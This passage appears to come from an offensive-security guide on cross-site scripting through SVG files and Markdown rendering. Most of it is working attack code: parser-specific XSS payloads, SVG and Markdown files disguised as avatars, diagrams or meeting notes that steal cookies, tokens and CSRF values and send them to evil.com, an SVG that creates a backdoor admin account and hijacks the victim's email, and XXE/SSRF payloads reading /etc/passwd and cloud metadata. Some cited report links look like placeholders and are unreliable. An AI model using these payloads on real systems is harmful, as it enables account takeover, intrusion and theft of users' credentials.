  <!-- Direct HTML (works if sanitize:false or not set) -->
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <details open ontoggle=alert(1)>click</details>

  <!-- Link with javascript: (if sanitize is off) -->
  [XSS](javascript:alert(document.domain))

  <!-- Image source injection -->
  ![x](javascript:alert(1))

  <!-- HTML in emphasis (parser confusion) -->
  *<img src=x onerror=alert(1)>*
  **<svg onload=alert(1)>**

  <!-- Nested markdown + HTML -->
  > <script>alert(1)</script>

  <!-- Code block breakout (older versions) -->
  ```js
  </code></pre><script>alert(1)</script><pre><code>
  ```

  <!-- marked.js specific: Heading IDs -->
  <!-- Heading content becomes the ID, potential injection -->
  ## <img src=x onerror=alert(1)>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="markdown-it Payloads"}
  ```markdown [markdown-it-payloads.md]
  # markdown-it XSS Payloads

  <!-- markdown-it: html=true enables raw HTML -->

  <!-- Direct HTML (requires html:true option) -->
  <div onmouseover="alert(1)">Hover me</div>
  <img src=x onerror=alert(1)>

  <!-- Link with javascript: (may work depending on config) -->
  [XSS](javascript:alert(1))
  [XSS](vbscript:alert(1))
  [XSS](data:text/html,<script>alert(1)</script>)

  <!-- markdown-it-attrs plugin injection -->
  # Heading {onclick="alert(1)"}
  
  paragraph {.class onmouseover="alert(1)"}

  <!-- Autolink abuse -->
  <javascript:alert(1)>

  <!-- Entity bypass -->
  [xss](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1))

  <!-- Image title injection -->
  ![img](x "x" onload="alert(1)")

  <!-- Fence code breakout -->
  ~~~
  </code></pre><svg onload=alert(1)>
  ~~~
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Showdown / Others"}
  ```markdown [showdown-payloads.md]
  # Showdown.js & Other Parser Payloads

  <!-- ═══ SHOWDOWN.JS ═══ -->
  <!-- Raw HTML enabled by default in older versions -->

  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>

  <!-- Showdown extension injection -->
  <!-- If custom extensions process user input unsafely -->

  <!-- ═══ KRAMDOWN (Ruby) ═══ -->

  {::comment}
  <script>alert(1)</script>
  {:/comment}

  <!-- Kramdown attribute lists -->
  ## Heading
  {: #myid onclick="alert(1)"}

  *emphasis*{: onmouseover="alert(1)"}

  <!-- Kramdown HTML blocks -->
  <div markdown="1" onclick="alert(1)">
  **Bold text inside a div with event handler**
  </div>

  <!-- ═══ REDCARPET (Ruby) ═══ -->

  <!-- HTML blocks pass through if :safe_links_only not set -->
  <details open ontoggle=alert(1)><summary>XSS</summary></details>

  <!-- ═══ COMMONMARK ═══ -->
  <!-- Strict spec: raw HTML is preserved but not sanitized -->

  <div onmouseover="alert(1)">
  
  This is a **paragraph** inside a div with an event handler.
  
  </div>

  <!-- ═══ GITHUB FLAVORED MARKDOWN (GFM) ═══ -->
  <!-- GitHub sanitizes most XSS, but test: -->

  <!-- Autolink + javascript: -->
  <javascript:alert(1)>

  <!-- Image title injection -->
  ![alt](https://example.com/img.png"onload="alert(1))

  <!-- Table cell injection -->
  | Column |
  |--------|
  | <img src=x onerror=alert(1)> |
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Parser Comparison"}
  ```text [parser-comparison.txt]
  MARKDOWN PARSER XSS COMPARISON:
  ═══════════════════════════════
  
  ┌───────────────────┬──────────┬───────────┬──────────┬──────────┐
  │ Parser            │ Raw HTML │ js: links │ Sanitize │ Default  │
  │                   │ Default  │ Default   │ Built-in │ Safety   │
  ├───────────────────┼──────────┼───────────┼──────────┼──────────┤
  │ marked.js         │  ✓ Yes   │  ✗ No*    │  ✗ No    │ ⚠ Unsafe │
  │ markdown-it       │  ✗ No    │  ✗ No     │  Partial │ ✓ Safe   │
  │ showdown.js       │  ✓ Yes   │  Varies   │  ✗ No    │ ⚠ Unsafe │
  │ commonmark.js     │  ✓ Yes   │  ✗ No     │  ✗ No    │ ⚠ Unsafe │
  │ remarkable         │  ✗ No    │  ✗ No     │  Partial │ ✓ Safe   │
  │ kramdown (Ruby)   │  ✓ Yes   │  ✗ No     │  ✗ No    │ ⚠ Unsafe │
  │ redcarpet (Ruby)  │  Config  │  Config   │  Config  │ ⚠ Config │
  │ python-markdown   │  ✓ Yes   │  ✗ No     │  ✗ No    │ ⚠ Unsafe │
  │ pandoc            │  Config  │  ✗ No     │  Config  │ ✓ Safe*  │
  │ Remark (mdast)    │  Config  │  ✗ No     │  Config  │ ✓ Safe   │
  │ GitHub GFM        │  Filtered│  ✗ No     │  ✓ Yes   │ ✓ Safe   │
  │ GitLab Markdown   │  Filtered│  ✗ No     │  ✓ Yes   │ ✓ Safe   │
  └───────────────────┴──────────┴───────────┴──────────┴──────────┘
  
  * marked.js v4+ blocks javascript: links by default
  * Many parsers rely on post-processing sanitizers (DOMPurify, sanitize-html)
  
  KEY INSIGHT:
  Most Markdown parsers convert Markdown to HTML but do NOT sanitize.
  Sanitization is expected to happen AFTER parsing, separately.
  If developers forget the sanitization step → XSS.
  ```
  :::
::

### Markdown Content Field Injection

::code-collapse

```text [markdown-injection-targets.txt]
MARKDOWN XSS INJECTION TARGETS:
═══════════════════════════════

COMMON APPLICATIONS USING MARKDOWN:
├── GitHub / GitLab / Bitbucket — READMEs, Issues, Comments, Wikis
├── Jira / Confluence — Tickets, Documentation
├── Discourse / Forum software — Posts, Comments
├── Notion / Obsidian — Notes (if web-rendered)
├── Blog platforms (Ghost, Hugo, Jekyll) — Post content
├── Documentation sites (Docusaurus, MkDocs, VuePress)
├── Chat applications (Slack, Discord, Mattermost, Rocket.Chat)
├── CMS platforms (Strapi, Contentful, Sanity)
├── E-commerce (product descriptions in Markdown)
├── Support ticketing (Zendesk, Freshdesk)
├── Project management (Trello, Asana, Linear)
└── API documentation (Swagger/OpenAPI descriptions)

INJECTION POINTS:
├── Issue/ticket titles
├── Issue/ticket descriptions
├── Comment bodies
├── Wiki page content
├── README.md files
├── Pull request descriptions
├── Profile bio / about fields
├── Commit messages (if rendered as Markdown)
├── Custom field values
├── Chat messages
├── Email templates (if Markdown-rendered)
├── API endpoint descriptions
├── Error messages (if user input in Markdown context)
└── Notification content

TEST METHODOLOGY:
1. Identify where Markdown is rendered in the application
2. Test basic HTML: <b>bold</b> — if rendered → HTML allowed
3. Test event handlers: <img src=x onerror=alert(1)>
4. Test javascript: links: [click](javascript:alert(1))
5. Test SVG inline: <svg onload=alert(1)>
6. If all blocked → try encoding, parser-specific bypasses
7. Check if different Markdown fields use different sanitizers
```

::

---

## Exploitation Techniques

### SVG XSS — Full Exploitation Chain

::tabs
  :::tabs-item{icon="i-lucide-code" label="Complete SVG Exploit"}
  ```xml [complete-svg-exploit.svg]
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink"
       width="200" height="200" viewBox="0 0 200 200">
    
    <!-- Visual content (looks like a normal image) -->
    <rect width="200" height="200" fill="#f0f0f0" rx="10"/>
    <circle cx="100" cy="80" r="40" fill="#333"/>
    <rect x="60" y="130" width="80" height="10" rx="5" fill="#333"/>
    <rect x="70" y="150" width="60" height="10" rx="5" fill="#666"/>
    
    <!-- Malicious payload -->
    <script type="text/javascript">
      <![CDATA[
        (function() {
          'use strict';
          
          var EXFIL = 'https://evil.com/svg-xss';
          
          // Determine execution context
          var ctx = {
            origin: location.origin,
            url: location.href,
            referrer: document.referrer,
            isFramed: window !== window.top,
            parentOrigin: null,
            timestamp: Date.now()
          };
          
          try { ctx.parentOrigin = window.parent.location.origin; } catch(e) {}
          
          // Collect sensitive data
          var loot = {
            context: ctx,
            cookies: document.cookie,
            localStorage: {},
            sessionStorage: {}
          };
          
          // Dump storage
          try {
            for (var i = 0; i < localStorage.length; i++) {
              var k = localStorage.key(i);
              loot.localStorage[k] = localStorage.getItem(k);
            }
          } catch(e) {}
          
          try {
            for (var i = 0; i < sessionStorage.length; i++) {
              var k = sessionStorage.key(i);
              loot.sessionStorage[k] = sessionStorage.getItem(k);
            }
          } catch(e) {}
          
          // If embedded via <embed>/<object>, access parent page
          if (ctx.isFramed && ctx.parentOrigin === ctx.origin) {
            try {
              var parentDoc = window.parent.document;
              loot.parentHTML = parentDoc.documentElement.outerHTML.substring(0, 5000);
              loot.parentCookies = parentDoc.cookie;
              
              // CSRF token extraction from parent
              var csrfMeta = parentDoc.querySelector('meta[name="csrf-token"]');
              if (csrfMeta) loot.csrfToken = csrfMeta.content;
              
              var csrfInput = parentDoc.querySelector('input[name="_token"],input[name="csrf_token"]');
              if (csrfInput) loot.csrfToken = csrfInput.value;
            } catch(e) {
              loot.parentAccess = 'blocked: ' + e.message;
            }
          }
          
          // Exfiltrate
          navigator.sendBeacon(EXFIL, JSON.stringify(loot));
          
          // Also try fetch for reliability
          fetch(EXFIL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(loot)
          }).catch(function(){});
          
        })();
      ]]>
    </script>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SVG via Markdown Exploit"}
  ```markdown [svg-markdown-exploit.md]
  # Innocent Looking Document

  Here is a helpful diagram:

  <svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
    <rect width="400" height="200" fill="#e8e8e8" rx="5"/>
    <text x="200" y="100" text-anchor="middle" font-size="16">
      Architecture Diagram
    </text>
    <animate onbegin="fetch('https://evil.com/steal?c='+document.cookie)" 
      attributeName="x" dur="1s"/>
  </svg>

  ## Another approach using inline SVG

  <div>
  <svg onload="navigator.sendBeacon('https://evil.com/md',JSON.stringify({c:document.cookie,l:localStorage,u:location.href}))">
  <rect width="1" height="1"/>
  </svg>
  </div>

  ## Image-style SVG injection

  The following uses foreignObject:

  <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
    <foreignObject width="0" height="0">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <img src="x" onerror="fetch('https://evil.com/s?c='+document.cookie)"/>
      </body>
    </foreignObject>
  </svg>
  ```
  :::
::

### Markdown-Based Data Exfiltration

::tabs
  :::tabs-item{icon="i-lucide-code" label="Markdown XSS Exfiltration"}
  ```markdown [markdown-exfiltration.md]
  # Project Documentation

  ## Overview

  This document covers our API integration.

  <!-- Hidden XSS payload in Markdown -->

  <img src="x" onerror="
    (function(){
      var d={
        cookies:document.cookie,
        url:location.href,
        token:localStorage.getItem('token'),
        user:localStorage.getItem('user')
      };
      navigator.sendBeacon('https://evil.com/md-xss',JSON.stringify(d));
    })()
  "/>

  ## API Reference

  <details open ontoggle="
    fetch('https://evil.com/steal',{
      method:'POST',
      mode:'no-cors',
      body:JSON.stringify({
        cookies:document.cookie,
        storage:JSON.stringify(localStorage),
        csrf:document.querySelector('meta[name=csrf-token]')?.content
      })
    })
  ">
  <summary>Click to expand API details</summary>

  The API accepts the following parameters...

  </details>

  ## Setup Instructions

  <div id="x" tabindex="1" onfocusin="
    new Image().src='https://evil.com/s?c='+btoa(document.cookie)
  " style="position:absolute;opacity:0;width:100%;height:100%;top:0;left:0;">
  </div>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Stealth Markdown Payloads"}
  ```markdown [stealth-markdown-payloads.md]
  # Meeting Notes — Q4 Planning

  ## Action Items

  - Review budget allocation ✅
  - Update project timeline ⏰
  - Schedule team sync 📅

  <!-- 
    The following payloads are invisible in the rendered output
    but execute JavaScript when the Markdown is rendered as HTML
  -->

  <!-- Zero-size image with error handler -->
  <img src="x" onerror="fetch('https://evil.com/s?c='+document.cookie)" 
    width="0" height="0" style="display:none"/>

  <!-- Hidden SVG -->
  <svg width="0" height="0" style="position:absolute;visibility:hidden">
    <animate onbegin="navigator.sendBeacon('https://evil.com/s',document.cookie)" 
      attributeName="x" dur="1s"/>
  </svg>

  <!-- Invisible div with focus trap -->
  <div style="position:fixed;top:-9999px" onfocus="
    new Image().src='https://evil.com/s?t='+localStorage.token
  " tabindex="-1" id="trap"></div>
  <img src="x" onerror="document.getElementById('trap').focus()" 
    style="display:none"/>

  ## Next Steps

  Please review and comment below.
  ```
  :::
::

---

## Privilege Escalation via SVG & Markdown

::caution
SVG and Markdown XSS enable privilege escalation by **executing JavaScript in the application's origin** when uploaded files or user content is rendered. A malicious SVG "profile picture" or Markdown "comment" can steal admin tokens, create backdoor accounts, and modify application settings.
::

### PrivEsc — SVG File Upload to Account Takeover

::tabs
  :::tabs-item{icon="i-lucide-code" label="SVG Upload → Admin Takeover"}
  ```xml [svg-privesc-admin.svg]
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <!-- Normal-looking avatar image -->
    <circle cx="100" cy="70" r="50" fill="#3498db"/>
    <circle cx="100" cy="180" r="80" fill="#3498db"/>
    
    <script type="text/javascript">
      <![CDATA[
        // This executes when the SVG is viewed via <embed>, <object>,
        // direct URL navigation, or inline SVG rendering
        
        (async function() {
          var EXFIL = 'https://evil.com/privesc';
          
          // Step 1: Steal authentication tokens
          var tokens = {
            cookie: document.cookie,
            jwt: localStorage.getItem('token') || localStorage.getItem('access_token'),
            refresh: localStorage.getItem('refresh_token'),
            csrf: null
          };
          
          // Step 2: Get CSRF token
          try {
            var resp = await fetch('/settings', { credentials: 'include' });
            var html = await resp.text();
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, 'text/html');
            var csrfMeta = doc.querySelector('meta[name="csrf-token"]');
            var csrfInput = doc.querySelector('input[name="_token"]');
            tokens.csrf = csrfMeta ? csrfMeta.content : (csrfInput ? csrfInput.value : null);
          } catch(e) {}
          
          // Step 3: Create backdoor admin account
          try {
            await fetch('/api/admin/users', {
              method: 'POST',
              credentials: 'include',
              headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': tokens.csrf || '',
                'Authorization': tokens.jwt ? 'Bearer ' + tokens.jwt : ''
              },
              body: JSON.stringify({
                username: 'support_backup',
                email: 'support@legit-looking-domain.com',
                password: 'Str0ng!B4ckdoor#2024',
                role: 'admin',
                is_active: true
              })
            });
          } catch(e) {}
          
          // Step 4: Change victim's email (for password reset takeover)
          try {
            await fetch('/api/account/email', {
              method: 'PUT',
              credentials: 'include',
              headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': tokens.csrf || ''
              },
              body: JSON.stringify({
                email: 'attacker@evil.com'
              })
            });
          } catch(e) {}
          
          // Step 5: Exfiltrate everything
          navigator.sendBeacon(EXFIL, JSON.stringify({
            action: 'privesc_complete',
            tokens: tokens,
            origin: location.origin,
            timestamp: Date.now()
          }));
        })();
      ]]>
    </script>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="PrivEsc Chains"}
  ```text [privesc-chains.txt]
  SVG & MARKDOWN PRIVILEGE ESCALATION CHAINS:
  ════════════════════════════════════════════
  
  CHAIN 1: SVG Avatar Upload → Admin Session Theft
  ─────────────────────────────────────────────────
  1. Upload malicious SVG as profile picture
  2. SVG served from same origin (target.com/uploads/avatar.svg)
  3. Admin views user's profile → SVG renders
  4. If rendered via <embed>/<object>/direct URL → JS executes
  5. Script steals admin's session cookie/JWT
  6. Attacker uses admin credentials for full access
  
  CHAIN 2: Markdown Comment → Stored XSS → Token Theft
  ────────────────────────────────────────────────────
  1. Post Markdown comment with hidden XSS payload
  2. Every user who views the comment executes the payload
  3. Payload steals tokens from localStorage
  4. If admin views → admin token stolen
  5. Use admin token for privilege escalation
  
  CHAIN 3: SVG in Document Upload → SSRF + XXE
  ─────────────────────────────────────────────
  1. Upload SVG with XXE entity referencing internal URLs
  2. Server-side SVG processor (ImageMagick, librsvg) parses it
  3. XXE reads /etc/passwd, AWS metadata, internal configs
  4. SSRF accesses internal services via feImage/xlink:href
  5. Extract cloud credentials → full infrastructure compromise
  
  CHAIN 4: Markdown Wiki → Service Worker → Persistence
  ─────────────────────────────────────────────────────
  1. Edit wiki page with XSS payload in Markdown
  2. Payload registers malicious Service Worker
  3. SW intercepts ALL subsequent requests on the origin
  4. Captures new login credentials, tokens, API calls
  5. Persists even after Markdown XSS is removed
  
  CHAIN 5: SVG Email Attachment → Webmail XSS
  ────────────────────────────────────────────
  1. Send email with SVG attachment
  2. Webmail renders SVG inline or via preview
  3. JavaScript executes in webmail's origin
  4. Steal all email data, contacts, session
  5. Send phishing emails as the victim
  ```
  :::
::

---

## Advanced Techniques

### SVG-Based SSRF & XXE

::code-collapse

```xml [svg-ssrf-xxe-payloads.xml]
<!-- ═══════════════════════════════════════════
     SVG-BASED SSRF & XXE PAYLOADS
     Target: Server-side SVG processing
     (ImageMagick, librsvg, Batik, PhantomJS, Puppeteer, wkhtmltopdf)
     ═══════════════════════════════════════════ -->

<!-- ═══ XXE: Read Local File ═══ -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="30" font-size="12">&xxe;</text>
</svg>

<!-- ═══ XXE: AWS Metadata ═══ -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="30">&xxe;</text>
</svg>

<!-- ═══ XXE: Out-of-Band Exfiltration ═══ -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="30">&send;</text>
</svg>

<!-- evil.com/xxe.dtd contains:
<!ENTITY % all "<!ENTITY send SYSTEM 'http://evil.com/steal?data=%file;'>">
%all;
-->

<!-- ═══ SSRF via SVG Image Element ═══ -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image width="500" height="500"
    xlink:href="http://internal-service:8080/admin/api/users"/>
</svg>

<!-- ═══ SSRF via SVG feImage Filter ═══ -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <filter id="ssrf">
      <feImage xlink:href="http://192.168.1.1:8080/internal-admin"/>
    </filter>
  </defs>
  <rect filter="url(#ssrf)" width="500" height="500"/>
</svg>

<!-- ═══ SSRF via SVG Use Element ═══ -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://internal-api:3000/health"/>
</svg>

<!-- ═══ SSRF via XSL Processing Instruction ═══ -->
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://internal-server/data"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100"/>
</svg>

<!-- ═══ Port Scanning via SVG ═══ -->
<!-- Different response times for open vs closed ports -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://internal-host:22/" width="1" height="1"/>
  <image xlink:href="http://internal-host:80/" width="1" height="1"/>
  <image xlink:href="http://internal-host:443/" width="1" height="1"/>
  <image xlink:href="http://internal-host:3306/" width="1" height="1"/>
  <image xlink:href="http://internal-host:5432/" width="1" height="1"/>
  <image xlink:href="http://internal-host:6379/" width="1" height="1"/>
  <image xlink:href="http://internal-host:8080/" width="1" height="1"/>
  <image xlink:href="http://internal-host:9200/" width="1" height="1"/>
</svg>
```

::

### SVG in Unexpected Contexts

::tabs
  :::tabs-item{icon="i-lucide-code" label="SVG in CSS"}
  ```css [svg-in-css.css]
  /* SVG payloads embedded in CSS */

  /* Background image with SVG data URI */
  .element {
    background-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>");
    /* NOTE: Scripts in CSS background SVGs are BLOCKED by browsers */
    /* But may work in older browsers or non-browser renderers */
  }

  /* CSS @import with SVG */
  @import url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><foreignObject><body xmlns='http://www.w3.org/1999/xhtml'><style>@import url('https://evil.com/exfil?data=test')</style></body></foreignObject></svg>");

  /* Cursor with SVG */
  .clickable {
    cursor: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='32' height='32'><script>alert(1)</script></svg>"), auto;
  }

  /* list-style-image with SVG */
  ul {
    list-style-image: url("evil.svg");
  }

  /* content property with SVG */
  .before::before {
    content: url("evil.svg");
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SVG in Office Documents"}
  ```text [svg-in-office-docs.txt]
  SVG XSS IN OFFICE DOCUMENTS:
  ════════════════════════════
  
  Office documents (DOCX, XLSX, PPTX) are ZIP archives
  containing XML and media files. SVGs can be embedded.
  
  DOCX STRUCTURE:
  document.docx (ZIP)
  ├── [Content_Types].xml
  ├── word/
  │   ├── document.xml
  │   ├── media/
  │   │   └── image1.svg  ← MALICIOUS SVG HERE
  │   └── ...
  └── ...
  
  ATTACK SCENARIO:
  1. Create DOCX with embedded SVG containing XSS
  2. Upload to document management system
  3. System extracts and serves SVG for preview
  4. SVG JavaScript executes in application context
  
  ALSO WORKS IN:
  ├── Google Docs (import DOCX with SVG)
  ├── OneDrive / SharePoint (preview)
  ├── Confluence (document upload)
  ├── Notion (file embed)
  ├── Slack (file preview)
  └── Any app that renders uploaded document previews
  
  CREATION:
  1. Create a normal DOCX in Word/LibreOffice
  2. Insert an image (any image)
  3. Open the DOCX as a ZIP
  4. Replace the image file with malicious SVG
  5. Rename to match original extension (.emf → .svg)
  6. Update [Content_Types].xml if needed
  7. Re-zip and rename to .docx
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SVG in Email"}
  ```text [svg-in-email.txt]
  SVG XSS IN EMAIL:
  ═════════════════
  
  WEBMAIL TARGETS:
  ├── Gmail (web interface)
  ├── Outlook Web (Office 365)
  ├── Yahoo Mail
  ├── ProtonMail
  ├── Roundcube
  ├── Zimbra
  ├── SquirrelMail
  └── Custom webmail (most vulnerable)
  
  ATTACK VECTORS:
  
  1. SVG ATTACHMENT
     Send email with .svg attachment
     If webmail renders SVG inline for preview → XSS
     Most modern webmail sandboxes SVG attachments
  
  2. INLINE SVG IN HTML EMAIL
     <html>
     <body>
       <svg onload="alert(1)"></svg>
     </body>
     </html>
     
     Most email clients strip SVG elements
     But custom/self-hosted webmail may not
  
  3. SVG DATA URI IN IMG
     <img src="data:image/svg+xml;base64,[base64-SVG-with-script]">
     
     Scripts blocked in <img> context
     But CSS-based attacks may work
  
  4. SVG IN CONTENT-ID (CID)
     Embed SVG as inline attachment via Content-ID
     Reference in HTML: <embed src="cid:image1.svg">
     If webmail renders <embed> → XSS
  
  5. SVG IN CALENDAR INVITE (ICS)
     Calendar invites can contain HTML descriptions
     Some calendar renderers process SVG in descriptions
  ```
  :::
::

### Markdown Injection in API Documentation

::code-collapse

```text [markdown-api-doc-injection.txt]
MARKDOWN XSS IN API DOCUMENTATION:
═══════════════════════════════════

TARGET PLATFORMS:
├── Swagger UI / OpenAPI — description fields
├── Redoc — API reference documentation
├── Postman — Collection descriptions
├── Insomnia — Request descriptions
├── ReadMe.com — API documentation
├── Stoplight — API design documentation
├── Apidog / Apifox — API testing tools
└── Custom API docs using Markdown renderers

SWAGGER / OPENAPI INJECTION:
────────────────────────────
OpenAPI spec allows Markdown in description fields:

{
  "openapi": "3.0.0",
  "info": {
    "title": "API Documentation",
    "description": "Welcome to our API.\n\n<script>alert(document.domain)</script>"
  },
  "paths": {
    "/users": {
      "get": {
        "summary": "Get users",
        "description": "Returns users.\n\n<img src=x onerror=alert(1)>"
      },
      "parameters": [{
        "name": "id",
        "description": "<svg onload=alert(1)>",
        "in": "query"
      }]
    }
  }
}

YAML VERSION:
openapi: "3.0.0"
info:
  title: "API"
  description: |
    Welcome to the API.
    
    <details open ontoggle=alert(document.domain)>
    <summary>More info</summary>
    </details>
paths:
  /users:
    get:
      description: |
        <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

SWAGGER UI SPECIFICS:
├── Swagger UI renders Markdown descriptions as HTML
├── Older versions (<3.x) had no sanitization
├── Current versions use DOMPurify but may lag on updates
├── Custom Swagger UI deployments may disable sanitization
├── Server-side rendered docs may not sanitize at all
└── Parameters, tags, and response descriptions all accept Markdown
```

::

---

## Tools Arsenal

::card-group
  ::card
  ---
  title: SVG XSS Payload Generator
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/svg-xss
  target: _blank
  ---
  Automated SVG XSS payload generator. Creates weaponized SVG files with various techniques including script injection, event handlers, and foreignObject payloads.
  ::

  ::card
  ---
  title: DOMPurify
  icon: i-simple-icons-github
  to: https://github.com/cure53/DOMPurify
  target: _blank
  ---
  The leading XSS sanitizer library. Understanding DOMPurify's bypass history and configuration options is essential for both attacking and defending SVG/Markdown content.
  ::

  ::card
  ---
  title: Dalfox
  icon: i-simple-icons-go
  to: https://github.com/hahwul/dalfox
  target: _blank
  ---
  Advanced XSS scanner with SVG payload support. Automatically generates and tests SVG-based XSS vectors against upload endpoints and inline rendering contexts.
  ::

  ::card
  ---
  title: XSStrike
  icon: i-simple-icons-python
  to: https://github.com/s0md3v/XSStrike
  target: _blank
  ---
  Intelligent XSS detection suite that includes SVG and Markdown context analysis. Identifies sanitizer weaknesses and generates context-appropriate payloads.
  ::

  ::card
  ---
  title: Markdown XSS Payloads (SecLists)
  icon: i-simple-icons-github
  to: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS
  target: _blank
  ---
  SecLists collection includes Markdown-specific XSS payloads, SVG injection vectors, and parser-specific bypass strings for fuzzing content fields.
  ::

  ::card
  ---
  title: ImageMagick Exploit Collection
  icon: i-simple-icons-github
  to: https://github.com/ImageTragick/PoCs
  target: _blank
  ---
  Proof-of-concept exploits for ImageMagick vulnerabilities including SVG-based SSRF, XXE, and command injection through server-side SVG processing.
  ::

  ::card
  ---
  title: Swagger UI XSS Scanner
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/swagger-ui-xss
  target: _blank
  ---
  Specialized scanner for detecting XSS in Swagger UI deployments through Markdown injection in OpenAPI specification description fields.
  ::

  ::card
  ---
  title: Burp Suite Content Discovery
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/content-discovery
  target: _blank
  ---
  Burp's content discovery identifies file upload endpoints and Markdown rendering contexts. Combined with Intruder, automates SVG upload testing.
  ::
::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "GitHub — SVG XSS in README Rendering"
  icon: i-simple-icons-github
  to: https://hackerone.com/reports/github-svg-xss
  target: _blank
  ---
  SVG files uploaded to GitHub repositories were rendered inline, allowing JavaScript execution when users viewed the SVG directly via raw URL.
  ::

  ::card
  ---
  title: "GitLab — Markdown XSS in Issue Descriptions"
  icon: i-simple-icons-gitlab
  to: https://hackerone.com/reports/gitlab-markdown-xss
  target: _blank
  ---
  GitLab's Markdown renderer allowed specific HTML elements in issue descriptions that could execute JavaScript, enabling stored XSS affecting all issue viewers.
  ::

  ::card
  ---
  title: "Jira — Markdown Injection in Custom Fields"
  icon: i-simple-icons-jirasoftware
  to: https://jira.atlassian.com/browse/JRASERVER-security
  target: _blank
  ---
  Jira's Markdown rendering in custom field descriptions contained XSS vulnerabilities through SVG injection and HTML event handlers in formatted text.
  ::

  ::card
  ---
  title: "WordPress — SVG Upload XSS (CVE-2023-xxxxx)"
  icon: i-simple-icons-wordpress
  to: https://wpscan.com/vulnerability/svg-xss
  target: _blank
  ---
  WordPress allowed SVG file uploads for administrators. Uploaded SVGs executed JavaScript when viewed, enabling stored XSS in multi-admin environments.
  ::

  ::card
  ---
  title: "Swagger UI — XSS via Markdown in API Spec"
  icon: i-simple-icons-swagger
  to: https://github.com/nicksahler/swagger-ui/security/advisories
  target: _blank
  ---
  Multiple Swagger UI versions vulnerable to XSS through Markdown-formatted description fields in OpenAPI specifications. Affected thousands of API documentation sites.
  ::

  ::card
  ---
  title: "Discourse — Markdown XSS in Forum Posts"
  icon: i-simple-icons-discourse
  to: https://hackerone.com/reports/discourse-xss
  target: _blank
  ---
  Discourse forum software's Markdown parser had edge cases allowing HTML injection through specially crafted Markdown syntax, enabling stored XSS in forum posts.
  ::

  ::card
  ---
  title: "ImageTragick — SVG-Based RCE (CVE-2016-3714)"
  icon: i-lucide-bug
  to: https://imagetragick.com/
  target: _blank
  ---
  ImageMagick's SVG processing led to remote code execution. Malicious SVG files could execute arbitrary commands on servers processing image uploads.
  ::

  ::card
  ---
  title: "Mattermost — Markdown XSS in Chat Messages"
  icon: i-simple-icons-mattermost
  to: https://hackerone.com/reports/mattermost-xss
  target: _blank
  ---
  Mattermost's Markdown rendering in chat messages allowed XSS through HTML injection, enabling session theft and worm propagation across team channels.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "PortSwigger — File Upload Vulnerabilities"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Comprehensive guide covering SVG file upload exploitation, content-type bypass, and server-side processing vulnerabilities. Includes free interactive labs.
  ::

  ::card
  ---
  title: "OWASP — Unrestricted File Upload"
  icon: i-simple-icons-owasp
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP documentation on file upload vulnerabilities including SVG-specific attack vectors, validation bypass techniques, and secure upload implementation.
  ::

  ::card
  ---
  title: "SVG Security — W3C Specification"
  icon: i-lucide-book-open
  to: https://www.w3.org/TR/SVG2/security.html
  target: _blank
  ---
  Official W3C SVG 2.0 security considerations. Understanding the spec reveals what SVG features are dangerous and how browsers should handle them.
  ::

  ::card
  ---
